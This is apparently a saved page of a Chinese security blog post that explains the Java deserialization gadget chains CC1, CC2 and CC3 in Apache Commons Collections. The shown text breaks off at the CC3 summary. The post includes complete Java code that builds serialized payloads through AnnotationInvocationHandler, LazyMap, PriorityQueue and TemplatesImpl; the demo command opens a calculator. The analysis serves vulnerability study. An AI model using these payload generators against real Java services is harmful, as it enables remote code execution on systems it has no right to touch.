@@ -1,0 +1,1206 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Java 反序列化漏洞（二） - Commons Collections | 素十八</title>
+<meta name="description" content="你救赎的人 终将成为你的光" />
+<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1749017091939">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://su18.org/styles/main.css">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154954923-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-154954923-1');
+</script>
+
+
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://su18.org">
+  <img class="avatar" src="https://su18.org/images/avatar.png?v=1749017091939" alt="">
+  </a>
+  <h1 class="site-title">
+    素十八
+  </h1>
+  <p class="site-description">
+    你救赎的人 终将成为你的光
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="http://javasec.org" class="menu" target="_blank">
+          Javasec
+        </a>
+      
+    
+      
+        <a href="https://www.downly.cn/" class="menu" target="_blank">
+          Downly
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/su18" target="_blank">
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/K_MnO4_" target="_blank">
+          <i class="fab fa-twitter"></i>
+        </a>
+      
+    
+      
+        <a href="https://weibo.com/u/1945525883" target="_blank">
+          <i class="fab fa-weibo"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Java 反序列化漏洞（二） - Commons Collections
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-05-21
+              </span>
+              <span>
+                36 min read
+              </span>
+              
+                <a href="https://su18.org/tag/YWv10I0qb/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+                <a href="https://su18.org/tag/J9zfIgD5go/" class="post-tag">
+                  # java
+                </a>
+              
+                <a href="https://su18.org/tag/V0FeVGMWY/" class="post-tag">
+                  # 漏洞原理
+                </a>
+              
+                <a href="https://su18.org/tag/bbwakgnJvv/" class="post-tag">
+                  # 学习笔记
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://su18.org/post-images/ysoserial-su18-2.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="commonscollections1">CommonsCollections1</h1>
+<p><a href="http://commons.apache.org/proper/commons-collections/index.html">Apache Commons Collections</a> 是一个扩展了 Java 标准库里的 Collection 结构的第三方基础库，它提供了很多强有力的数据结构类型并实现了各种集合工具类。作为 Apache 开源项目的重要组件，被广泛运用于各种 Java 应用的开发。</p>
+<h2 id="前置知识">前置知识</h2>
+<p>在看具体漏洞之前，先来看一下一些基础知识。</p>
+<h3 id="abstractmapdecorator">AbstractMapDecorator</h3>
+<p>首先 CC 库中提供了一个抽象类 <code>org.apache.commons.collections.map.AbstractMapDecorator</code>，这个类是 Map 的扩展，并且从名字中可以知道，这是一个基础的装饰器，用来给 map 提供附加功能，被装饰的 map 存在该类的属性中，并且将所有的操作都转发给这个 map。</p>
+<p>这个类有很多实现类，各个类触发的方式不同，重点关注的是 TransformedMap 以及 LazyMap。</p>
+<h4 id="transformedmap">TransformedMap</h4>
+<p><code>org.apache.commons.collections.map.TransformedMap</code> 类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由 Transformer 来定义，Transformer 在 TransformedMap 实例化时作为参数传入。测试用例如下：</p>
+<figure data-type="image" tabindex="1"><img src="https://su18.org/post-images/1626657477238.png" alt="" loading="lazy"></figure>
+<p>也就是说当 TransformedMap 内的 key 或者 value 发生变化时（例如调用 TransformedMap 的 <code>put</code> 方法时），就会触发相应参数的 Transformer 的 <code>transform()</code> 方法。</p>
+<h4 id="lazymap">LazyMap</h4>
+<p><code>org.apache.commons.collections.map.LazyMap</code> 与 TransformedMap 类似，不过差异是调用 <code>get()</code> 方法时如果传入的 key 不存在，则会触发相应参数的 Transformer 的 <code>transform()</code> 方法。</p>
+<p>与 LazyMap 具有相同功能的，是 <code>org.apache.commons.collections.map.DefaultedMap</code>，同样是 <code>get()</code> 方法会触发 transform 方法。</p>
+<h3 id="transformer">Transformer</h3>
+<p><code>org.apache.commons.collections.Transformer</code> 是一个接口，提供了一个 <code>transform()</code> 方法，用来定义具体的转换逻辑。方法接收 Object 类型的 input，处理后将 Object 返回。</p>
+<p>在 Commons Collection 3.2.1 中，程序提供了 14 个 Transformer 的实现类，用来实现不同的对 TransformedMap 中 key/value 进行修改的功能。</p>
+<figure data-type="image" tabindex="2"><img src="https://su18.org/post-images/1626658616554.png" alt="" loading="lazy"></figure>
+<p>重点关注其中几个实现类。</p>
+<h4 id="invokertransformer">InvokerTransformer</h4>
+<p>这个实现类从 Commons Collections 3.0 引入，功能是使用反射创建一个新对象，我们来看一下它的 transfrom 方法，方法注释写的很清楚，通过调用 input 的方法，并将方法返回结果作为处理结果进行返回。</p>
+<figure data-type="image" tabindex="3"><img src="https://su18.org/post-images/1626659439242.png" alt="" loading="lazy"></figure>
+<p>调用需要的参数 iMethodName/iParamTypes 是在 InvokerTransformer 的构造函数中传入。这样我们就可以使用 InvokerTransformer 来执行方法，测试代码：</p>
+<pre><code class="language-java">// InvokerTransformer 弹计算器测试
+Transformer transformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open -a Calculator.app&quot;});
+transformer.transform(Runtime.getRuntime());
+</code></pre>
+<h4 id="chainedtransformer">ChainedTransformer</h4>
+<p><code>org.apache.commons.collections.functors.ChainedTransformer</code> 类也是一个 Transformer的实现类，但是这个类自己维护了一个 Transformer 数组， 在调用 ChainedTransformer 的 transform 方法时，会循环数组，依次调用 Transformer 数组中每个 Transformer 的 transform 方法，并将结果传递给下一个 Transformer。</p>
+<figure data-type="image" tabindex="4"><img src="https://su18.org/post-images/1626665059905.png" alt="" loading="lazy"></figure>
+<p>这样就给了使用者链式调用多个 Transformer 分别处理对象的能力。</p>
+<h4 id="constanttransformer">ConstantTransformer</h4>
+<p><code>org.apache.commons.collections.functors.ConstantTransformer</code> 是一个返回固定常量的 Transformer，在初始化时储存了一个 Object，后续的调用时会直接返回这个 Object。</p>
+<p>这个类用于和 ChainedTransformer 配合，将其结果传入 InvokerTransformer 来调用我们指定的类的指定方法。</p>
+<h2 id="攻击构造">攻击构造</h2>
+<p>有了上述基础知识的铺垫，就可以开始构造反序列化的恶意利用代码了。</p>
+<p>例如我们还是要执行 <code>Runtime.getRuntime().exec(&quot;open -a Calculator.app&quot;)</code>，按照需求对其进行拆分，这里使用 TransformedMap 触发，实例代码如下：</p>
+<pre><code class="language-java">// 结合 ChainedTransformer
+ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
+		new ConstantTransformer(Runtime.class),
+		new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}),
+		new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+		new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open -a Calculator.app&quot;})
+});
+
+
+Map map2 = TransformedMap.decorate(hashMap, chain, null);
+map2.put(10, &quot;aaa&quot;);
+</code></pre>
+<p>使用 ConstantTransformer 返回 Runtime 的 Class 对象，传入 InvokerTransformer 中，并借助 ChainedTransformer 的链式调用方式完成反射的调用，支持恶意代码。在上述案例中，使用 TransformedMap 的 decorate 方法将 ChainedTransformer 设置为 map 的装饰器处理方法后，当调用 TransformedMap 的 put/setValue 等方法时会触发 Transformer 链的调用处理。</p>
+<p>截止到这里，我们利用 CC 库成功构造了 sink gadget 和 chain gadget，接下来我们需要找到一个 kick-off gadget：一个类重写了 readObject ，在反序列化时可以改变 map 的值。</p>
+<p>于是我们找到了 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 这个类。这个类实现了 InvocationHandler 接口，原本是用于 JDK 对于注解形式的动态代理。</p>
+<p>我们来看一下这个类的代码，首先是构造方法：</p>
+<figure data-type="image" tabindex="5"><img src="https://su18.org/post-images/1626683616459.png" alt="" loading="lazy"></figure>
+<p>构造方法接收两个参数，第一个参数是 Annotation 实现类的 Class 对象，第二个参数是是一个 key 为 String、value 为 Object 的 Map。构造方法判断 var1 有且只有一个父接口，并且是 <code>Annotation.class</code>，才会将两个参数初始化在成员属性 type 和 memberValues 中。</p>
+<figure data-type="image" tabindex="6"><img src="https://su18.org/post-images/1626682238960.png" alt="" loading="lazy"></figure>
+<p>这里的 memberValues 就是用来触发的 Map。接下来我们看一下这个类重写的 readObject 方法：</p>
+<figure data-type="image" tabindex="7"><img src="https://su18.org/post-images/1626682224442.png" alt="" loading="lazy"></figure>
+<p>首先调用 <code>AnnotationType.getInstance(this.type)</code> 方法来获取 type 这个注解类对应的 AnnotationType 的对象，然后获取其 memberTypes 属性，这个属性是个 Map，存放这个注解中可以配置的值。</p>
+<p>然后循环 <code>this.memberValues</code> 这个 Map ，获取其 Key，如果注解类的 memberTypes 属性中存在与  <code>this.memberValues</code>  的 key 相同的属性，并且取得的值不是 ExceptionProxy 的实例也不是 memberValues 中值的实例，则取得其值，并调用 setValue 方法写入值。</p>
+<p>用语言描述这些代码可能有些拗口，注解本质是一个继承了 Annotation 的特殊接口，其具体实现类是 Java 运行时生成的动态代理类。通过代理对象调用自定义注解（接口）的方法，会最终调用 AnnotationInvocationHandler 的 invoke 方法。该方法会从 memberValues 这个 Map 中索引出对应的值。</p>
+<p>而重写 readObject 方法，则给了程序传递注解值的能力了。</p>
+<p>所以我们构造恶意 payload 的思路就清楚了：</p>
+<ul>
+<li>构造一个 AnnotationInvocationHandler 实例，初始化时传入一个注解类和一个 Map，这个 Map 的 key 中要有注解类中存在的属性，但是值不是对应的实例，也不是 ExceptionProxy 对象。</li>
+<li>这个 Map 由 TransformedMap 封装，并调用自定义的 ChainedTransformer 进行装饰。</li>
+<li>ChainedTransformer 中写入多个 Transformer 实现类，用于链式调用，完成恶意操作。</li>
+</ul>
+<p>所以最终的恶意代码为：</p>
+<pre><code class="language-java">public class CC1WithTransformedMap {
+
+	public static String fileName = &quot;CC1withTransformedMap.bin&quot;;
+
+	public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException,
+			InstantiationException, IllegalAccessException, IOException {
+
+		Map hashMap = new HashMap();
+		// 这里 key 一定是 下面实例化 AnnotationInvocationHandler 时传入的注解类中存在的属性值
+		// 并且这里的值的一定不是属性值的类型
+		hashMap.put(&quot;comments&quot;, 2);
+
+		// 结合 ChainedTransformer
+		ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
+				new ConstantTransformer(Runtime.class),
+				new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}),
+				new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+				new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open -a Calculator.app&quot;})
+		});
+
+
+		Map      transformedMap = TransformedMap.decorate(hashMap, null, chain);
+		Class&lt;?&gt; c              = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+
+		Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
+		constructor.setAccessible(true);
+		InvocationHandler handler = (InvocationHandler) constructor.newInstance(Generated.class, transformedMap);
+
+		SerializeUtil.writeObjectToFile(handler, fileName);
+//		SerializeUtil.readFileObject(fileName);
+	}
+}
+</code></pre>
+<p>这里有个细节就是网上大多数 payload 使用 <code>Target.class</code> 的 value 属性来触发，其实用什么都行，找任意一个有属性的注解都可以，在上面的示例代码中，我使用了 <code>Generated.class</code> 的 comments 属性。</p>
+<p>除了用 TransformedMap，还可以用 LazyMap 来触发，之前提到过，LazyMap 通过 <code>get()</code> 方法获取不到 key 的时候触发 Transformer。</p>
+<p>我们发现 AnnotationInvocationHandler 的 invoke() 方法可以触发 memberValues 的 get 方法。</p>
+<figure data-type="image" tabindex="8"><img src="https://su18.org/post-images/1626692184949.png" alt="" loading="lazy"></figure>
+<p>这里用到了动态代理，总结起来的一句话就是被动态代理的对象调用任意方法都会调用对应的InvocationHandler 的 <code>invoke</code> 方法。</p>
+<p>那构造的思路的就有了，在使用带有装饰器的 LazyMap 初始化 AnnotationInvocationHandler 之前，先使用 InvocationHandler 代理一下 LazyMap，这样反序列化 AnnotationInvocationHandler 时，调用 LazyMap 值的 setValue 方法之前会调用代理类的 invoke 方法，触发 LazyMap 的 get 方法。</p>
+<p>不得不说这种思路稍微有些变态，因为使用了 AnnotationInvocationHandler 作为反序列化触发点，又同时使用其动态代理特性，所以有点绕。那么最终的恶意代码为：</p>
+<pre><code class="language-java">public class CC1WithLazyMap {
+
+
+	public static String fileName = &quot;CC1withLazyMap.bin&quot;;
+
+
+	public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
+		// 结合 ChainedTransformer
+		ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
+				new ConstantTransformer(Runtime.class),
+				new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}),
+				new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+				new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open -a Calculator.app&quot;})
+		});
+
+
+		Map            lazyMap     = LazyMap.decorate(new HashMap(), chain);
+		Class&lt;?&gt;       c           = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+		Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
+		constructor.setAccessible(true);
+
+		// 创建携带着 LazyMap 的 AnnotationInvocationHandler 实例
+		InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);
+		// 创建LazyMap的动态代理类实例
+		Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);
+
+		// 使用动态代理初始化 AnnotationInvocationHandler
+		InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, mapProxy);
+
+		SerializeUtil.writeObjectToFile(invocationHandler, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<h2 id="总结">总结</h2>
+<p>以上就是 CC1 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>利用 AnnotationInvocationHandler 在反序列化时会触发 Map 的 get/set 等操作，配合 TransformedMap/LazyMap 在执行 Map 对象的操作时会根据不同情况调用 Transformer 的转换方法，最后结合了 ChainedTransformer 的链式调用、InvokerTransformer 的反射执行完成了恶意调用链的构成。其中 LazyMap 的触发还用到了动态代理机制。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject()</code></li>
+<li>sink gadget：<code>org.apache.commons.collections.functors.InvokerTransformer#transform()</code></li>
+<li>chain gadget：<code>org.apache.commons.collections.functors.ChainedTransformer#transform()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>AnnotationInvocationHandler.readObject()
+   *Map(Proxy).entrySet()
+        *AnnotationInvocationHandler.invoke()
+            LazyMap.get()/TransformedMap.setValue()
+                ChainedTransformer.transform()
+                    ConstantTransformer.transform()
+                        InvokerTransformer.transform()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>commons-collections : 3.1<br>
+TransformedMap -  jdk &lt; 8u71</p>
+</blockquote>
+<h1 id="commonscollections2">CommonsCollections2</h1>
+<p>还是 CC 库的链，测试依赖版本 commons-collections4 4.0</p>
+<h2 id="前置知识-2">前置知识</h2>
+<h3 id="priorityqueue">PriorityQueue</h3>
+<p>PriorityQueue 优先级队列是基于优先级堆（a priority heap）的一种特殊队列，他给每个元素定义“优先级”，这样取出数据的时候会按照优先级来取。默认情况下，优先级队列会根据自然顺序对元素进行排序。</p>
+<p>因此，放入PriorityQueue的元素，必须实现 Comparable 接口，PriorityQueue 会根据元素的排序顺序决定出队的优先级。如果没有实现 Comparable 接口，PriorityQueue 还允许我们提供一个 Comparator 对象来判断两个元素的顺序。<br>
+s<br>
+PriorityQueue 支持反序列化，在重写的 readObject 方法中，将数据反序列化到 <code>queue</code> 中之后，会调用 <code>heapify()</code> 方法来对数据进行排序。</p>
+<figure data-type="image" tabindex="9"><img src="https://su18.org/post-images/1626758707158.png" alt="" loading="lazy"></figure>
+<p><code>heapify()</code> 方法调用 <code>siftDown()</code> 方法，在 comparator 属性不为空的情况下，调用 <code>siftDownUsingComparator()</code> 方法</p>
+<figure data-type="image" tabindex="10"><img src="https://su18.org/post-images/1626759553964.png" alt="" loading="lazy"></figure>
+<p>在 <code>siftDownUsingComparator()</code> 方法中，会调用 comparator 的 <code>compare()</code> 方法来进行优先级的比较和排序。</p>
+<figure data-type="image" tabindex="11"><img src="https://su18.org/post-images/1626759613604.png" alt="" loading="lazy"></figure>
+<p>这样，反序列化之后的优先级队列，也拥有了顺序。</p>
+<h3 id="transformingcomparator">TransformingComparator</h3>
+<p>TransformingComparator 是触发这个漏洞的一个关键点，他将 Transformer 执行点和 PriorityQueue 触发点连接了起来。</p>
+<p>TransformingComparator 看类名就类似 TransformedMap，实际作用也类似，用 Tranformer 来装饰一个 Comparator。也就是说，待比较的值将先使用 Tranformer 转换，再传递给 Comparator 比较。</p>
+<p>TransformingComparator 初始化时配置 Transformer 和 Comparator，如果不指定 Comparator，则使用 <code>ComparableComparator.&lt;Comparable&gt;comparableComparator()</code>。</p>
+<figure data-type="image" tabindex="12"><img src="https://su18.org/post-images/1626763893534.png" alt="" loading="lazy"></figure>
+<p>在调用 TransformingComparator 的 <code>compare</code> 方法时，可以看到调用了 <code>this.transformer.transform()</code> 方法对要比较的两个值进行转换，然后再调用 compare 方法比较。</p>
+<figure data-type="image" tabindex="13"><img src="https://su18.org/post-images/1626764313782.png" alt="" loading="lazy"></figure>
+<h3 id="templatesimpl">TemplatesImpl</h3>
+<p>关于 TemplatesImpl 的反序列化触发方式，在我之前的 <a href="https://su18.org/post/fastjson/#1-fastjson-1224">fastjson</a> 文章中有描述，这里不再占用篇幅，简单总结一下就是：</p>
+<ul>
+<li>TemplatesImpl 的属性 <code>_bytecodes</code> 存储了类字节码</li>
+<li>TemplatesImpl 类的部分方法可以使用这个类字节码去实例化这个类，这个类的父类需是 AbstractTranslet</li>
+<li>在这个类的无参构造方法或静态代码块中写入恶意代码，再借 TemplatesImpl 之手实例化这个类触发恶意代码</li>
+</ul>
+<h2 id="攻击构造-2">攻击构造</h2>
+<p>看到了 Transformer 对象，那后面的攻击流程就容易理解了，还是使用 ChainedTransformer 调用 InvokerTransformer 来触发恶意操作。</p>
+<p>最终的恶意代码为：</p>
+<pre><code class="language-java">public class CC2WithChain {
+
+	public static String fileName = &quot;CC2WithChain.bin&quot;;
+
+	public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException {
+
+		// 初始化 Transformer
+		ChainedTransformer chain = new ChainedTransformer(new ConstantTransformer(Runtime.class),
+				new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}),
+				new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+				new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open -a Calculator.app&quot;}));
+
+		TransformingComparator comparator = new TransformingComparator(chain);
+
+		// 在初始化时不带入 comparator，而是
+		PriorityQueue&lt;String&gt; queue = new PriorityQueue&lt;&gt;(2);
+		queue.add(&quot;1&quot;);
+		queue.add(&quot;2&quot;);
+
+		Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+		field.setAccessible(true);
+		field.set(queue, comparator);
+
+		SerializeUtil.writeObjectToFile(queue, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<p>这里需要注意的是，在初始化 PriorityQueue 时没有指定 comparator，而是使用反射写入，这是为了避免在向 queue 中添加内容时触发排序而导致触发恶意 payload。</p>
+<p>ysoserial 的 CC2 没有使用 ChainedTransformer，而直接使用了 InvokerTransformer 配合 TemplatesImpl 直接加载恶意类的 bytecode。</p>
+<p>触发逻辑为：</p>
+<ul>
+<li>创建恶意的 TemplatesImpl 对象，写入 <code>_bytecodes</code>、<code>_name</code> 属性，完成调用 newTransformer 方法触发恶意类的实例化的条件。</li>
+<li>创建 PriorityQueue，由于 TemplatesImpl 不是 Comparable 对象，需要反射将恶意的 TemplatesImpl 对象写入到 PriorityQueue 的 queue 中。</li>
+<li>使用 InvokerTransformer （调用被装饰对象的 newTransformer 方法）创建 TransformingComparator ，并将其赋予到 PriorityQueue 中。</li>
+</ul>
+<p>最终的恶意代码为：</p>
+<pre><code class="language-java">public class CC2WithTemplatesImpl {
+
+	public static String fileName = &quot;CC2WithTemplatesImpl.bin&quot;;
+
+	public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
+
+		// 读取恶意类 bytes[]
+		InputStream inputStream = CC2WithTemplatesImpl.class.getResourceAsStream(&quot;EvilClassForCC2.class&quot;);
+		byte[]      bytes       = new byte[inputStream.available()];
+		inputStream.read(bytes);
+
+		// 初始化 PriorityQueue
+		PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(2);
+		queue.add(&quot;1&quot;);
+		queue.add(&quot;2&quot;);
+
+
+		// 初始化 TemplatesImpl 对象
+		TemplatesImpl tmpl      = new TemplatesImpl();
+		Field         bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);
+		bytecodes.setAccessible(true);
+		bytecodes.set(tmpl, new byte[][]{bytes});
+		// _name 不能为空
+		Field name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);
+		name.setAccessible(true);
+		name.set(tmpl, &quot;su18&quot;);
+
+		Field field = PriorityQueue.class.getDeclaredField(&quot;queue&quot;);
+		field.setAccessible(true);
+		Object[] objects = (Object[]) field.get(queue);
+		objects[0] = tmpl;
+
+		// 用 InvokerTransformer 来反射调用 TemplatesImpl 的 newTransformer 方法
+		// 这个类是 public 的，方便调用
+		Transformer            transformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]{}, new Object[]{});
+		TransformingComparator comparator  = new TransformingComparator(transformer);
+
+		Field field2 = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+		field2.setAccessible(true);
+		field2.set(queue, comparator);
+
+		SerializeUtil.writeObjectToFile(queue, fileName);
+		SerializeUtil.readFileObject(fileName);
+
+	}
+}
+</code></pre>
+<h2 id="总结-2">总结</h2>
+<p>以上就是 CC2 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
+<li>利用 PriorityQueue 在反序列化后会对队列进行优先级排序的特点，为其指定 TransformingComparator 排序方法，并在其中为其添加 Transforer，与 CC1 类似，主要的触发位置还是 InvokerTransformer。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>java.util.PriorityQueue#readObject()</code></li>
+<li>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer()</code></li>
+<li>chain gadget：<code>org.apache.commons.collections4.comparators.TransformingComparator#compare()</code></li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<pre><code>PriorityQueue.readObject()
+    TransformingComparator.compare()
+        *ChainedTransformer.transform()
+                InvokerTransformer.transform()
+                    TemplatesImpl.newTransformer()
+</code></pre>
+<ol start="4">
+<li>依赖版本</li>
+</ol>
+<blockquote>
+<p>commons-collections4 : 4.0</p>
+</blockquote>
+<h1 id="commonscollections3">CommonsCollections3</h1>
+<p>CC3 官方描述为 CC1 的变种，其中能看到 CC1 和 CC2 的部分影子，但是部分技术细节并不相同。</p>
+<p>在 CC1 中，使用了 AnnotationInvocationHandler 对 LazyMap 进行代理，在反序列化时触发 LazyMap 的 get 方法，并对 LazyMap 装饰 Transformer 触发漏洞。</p>
+<p>在 CC2 中，使用 TemplatesImpl 的 newTransformer 方法触发实例化恶意类触发漏洞，方法的调用则是使用了 InvokerTransformer 反射调用。</p>
+<p>而在 CC3 中，使用了 CC1 和 LazyMap 和 CC3 的 TemplatesImpl，中间寻找了其他的触发 newTransformer 的实现方式。</p>
+<h2 id="前置知识-3">前置知识</h2>
+<h3 id="traxfilter">TrAXFilter</h3>
+<p>在 SAX API 中提供了一个过滤器接口 <code>org.xml.sax.XMLFilter</code>，XMLFilterImpl 是对它的缺省实现，使用过滤器进行应用程序开发时，只要继承 XMLFilterImpl，就可以方便的实现自己的功能。</p>
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code> 是对  XMLFilterImpl 的实现，在其基础上扩展了 Templates/TransformerImpl/TransformerHandlerImpl 属性，</p>
+<p>TrAXFilter 在实例化时接收 Templates 对象，并调用其 newTransformer 方法，这就可以触发我们的  TemplatesImpl 的攻击 payload 了。</p>
+<figure data-type="image" tabindex="14"><img src="https://su18.org/post-images/1626832704611.png" alt="" loading="lazy"></figure>
+<h3 id="instantiatetransformer">InstantiateTransformer</h3>
+<p>有了上述 gadget ，接下来的重点就是需要我们实例化这个 TrAXFilter，实例化我们当然可以使用 InvokerTransformer 反射拿到 Constructor 再 newInstance，但是同样地可以直接使用另外一个 Transformer：InstantiateTransformer。</p>
+<p>Commons Collections 提供了 InstantiateTransformer 用来通过反射创建类的实例，可以看到 <code>transform()</code> 方法实际上接收一个 Class 类型的对象，通过 <code>getConstructor</code> 获取构造方法，并通过 <code>newInstance</code> 创建类实例。</p>
+<figure data-type="image" tabindex="15"><img src="https://su18.org/post-images/1626833643278.png" alt="" loading="lazy"></figure>
+<p>反射需要的 iParamTypes 参数类型、iArgs 参数值则在 InstantiateTransformer 初始化时赋值。</p>
+<figure data-type="image" tabindex="16"><img src="https://su18.org/post-images/1626833637547.png" alt="" loading="lazy"></figure>
+<h2 id="攻击构造-3">攻击构造</h2>
+<p>由此，结合上面的点，可以构造出完全的攻击代码：</p>
+<pre><code class="language-java">public class CC3 {
+
+	public static String fileName = &quot;CC3.bin&quot;;
+
+	public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException {
+
+		// 读取恶意类 bytes[]
+		InputStream inputStream = CC3.class.getResourceAsStream(&quot;EvilClassForCC3.class&quot;);
+		byte[]      bytes       = new byte[inputStream.available()];
+		inputStream.read(bytes);
+
+		// 初始化 TemplatesImpl 对象
+		TemplatesImpl tmpl      = new TemplatesImpl();
+		Field         bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);
+		bytecodes.setAccessible(true);
+		bytecodes.set(tmpl, new byte[][]{bytes});
+		// _name 不能为空
+		Field name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);
+		name.setAccessible(true);
+		name.set(tmpl, &quot;su18&quot;);
+
+
+		// 结合 ChainedTransformer
+		ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
+				new ConstantTransformer(TrAXFilter.class),
+				new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl})
+		});
+
+		// 初始化 LazyMap
+		Map            lazyMap     = LazyMap.decorate(new HashMap(), chain);
+		Class&lt;?&gt;       c           = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+		Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
+		constructor.setAccessible(true);
+
+		// 创建携带着 LazyMap 的 AnnotationInvocationHandler 实例
+		InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);
+		// 创建LazyMap的动态代理类实例
+		Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);
+
+		// 使用动态代理初始化 AnnotationInvocationHandler
+		InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, mapProxy);
+
+		SerializeUtil.writeObjectToFile(invocationHandler, fileName);
+//		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<h2 id="总结-3">总结</h2>
+<p>以上就是 CC3 链分析的全部内容了，最后总结一下。</p>
+<ol>
+<li>利用说明：
+<ul>
